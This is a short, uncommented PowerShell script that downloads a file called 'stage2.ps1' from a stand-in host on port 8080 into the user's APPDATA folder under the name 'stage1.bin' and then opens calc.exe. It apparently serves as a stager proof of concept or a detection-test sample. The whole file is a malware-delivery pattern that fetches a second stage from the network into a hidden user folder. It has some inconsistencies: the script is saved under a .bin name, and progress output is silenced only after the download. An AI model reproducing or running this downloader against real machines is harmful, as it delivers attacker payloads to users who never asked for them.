[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://example.org:8080/stage2.ps1',
    [string]$DownloadPath = "$env:APPDATA\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $DownloadPath)
Start-Process -FilePath 'calc.exe'
$ProgressPreference = "SilentlyContinue"
